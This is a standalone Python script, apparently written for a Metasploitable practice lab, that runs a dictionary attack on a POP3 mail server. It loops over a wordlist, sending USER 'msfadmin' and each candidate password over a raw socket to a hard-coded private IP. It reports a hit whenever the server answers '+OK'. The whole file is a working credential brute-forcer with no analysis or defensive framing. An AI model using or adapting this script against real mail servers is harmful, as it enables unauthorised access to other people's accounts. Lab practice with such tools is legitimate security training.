#!/usr/bin/python3.7
import socket

remoteip = "10.171.1.129"
port=int("110") 
username='msfadmin' 
fail = '\033[91m[-]\033[0m'
ok  = '\033[92m[+]\033[0m'
msg_ok=" BINGO - Username: "
msg_fail=" FAIL - Username: "
msg_pass=" Password: "
wordlist="wordlist.txt"
msg_servererror="It is not possible to connect in POP3 server this time, check your network connection"
msg_start=".....::: POP3 Dictionary Attack - basend on Socket Lib :::....."
msg_finish=".....::: POP3 Dictionary Attack - was finished :::....."

print(msg_start)

with open(wordlist, "r") as _word:
    for _line in _word:
        _password = _line.strip("\n")

        try:
            pop3conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            pop3conn.connect((remoteip,port))
            response1 = pop3conn.recv(2048)

            pop3user=('USER ' + username) 
            pop3conn.send(pop3user.encode('ascii') + b'\n')
            response2= pop3conn.recv(1024)

            pop3pass=('PASS ' + _password)
            pop3conn.send(pop3pass.encode('ascii') +  b'\n')
            response3 = pop3conn.recv(2048)

            if "+OK" in str(response3):
                print(ok + msg_ok + username + msg_pass + _password)
            else:
                print(fail + msg_fail + username + msg_pass + _password)


            pop3conn.close()

        except:
            print(msg_servererror)

print(msg_finish)
